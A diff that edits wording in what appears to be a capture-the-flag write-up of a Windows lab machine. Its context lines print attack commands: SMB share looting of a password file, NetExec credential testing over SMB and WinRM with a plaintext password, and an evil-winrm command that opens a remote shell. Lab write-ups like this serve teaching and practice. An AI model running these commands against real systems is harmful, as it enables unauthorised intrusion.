@@ -158,7 +158,7 @@ NETLOGON
 SYSVOL
 users$
 ```
-After some manual enumeration, we found a file called "azure.xml" containing a password. We can use the "mget" command to get it:
+After some manual enumeration, we can find a file called "azure.xml" containing a password. We can use the "mget" command to get it:
 ```shell
 # use users$
 # ls
@@ -209,7 +209,7 @@ We used the following NetExec commands to test the credentials on SMB and WinRM:
 nxc smb 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' --continue-on-success
 nxc winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' --continue-on-success
 ```
-Using impacket-psexec won't give us a shell, since the shares are not writeable. But using Evil-WinRM we can get shell access, thanks to the credentials being valid for WinRM:
+Using impacket-psexec won't give us a shell, since the shares are not writeable. But using evil-winrm we can get shell access, thanks to the credentials being valid for WinRM:
 ```shell
 evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
 ```
